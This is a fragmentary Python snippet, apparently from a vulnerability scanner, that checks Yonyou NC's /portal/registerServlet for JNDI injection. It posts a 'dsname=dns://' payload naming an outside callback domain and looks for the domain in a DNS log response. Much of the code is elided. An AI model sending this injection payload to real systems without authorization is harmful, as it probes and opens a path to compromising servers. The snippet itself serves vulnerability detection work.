...
def check(url):
    url = url.rstrip("/")
    taeget_url = urljoin(url, "/portal/registerServlet")
    try:
        headers = {
        ...
        data = """type=1&dsname=dns://{}""".format(domain)
        ...
        for i in range(0, 3):
            ...
            if domain in refresh.text:
                print(f"\033[31mDiscovered:{url}:YongyouNC_registerServlet_JNDIInject!\033[0m")
                return True
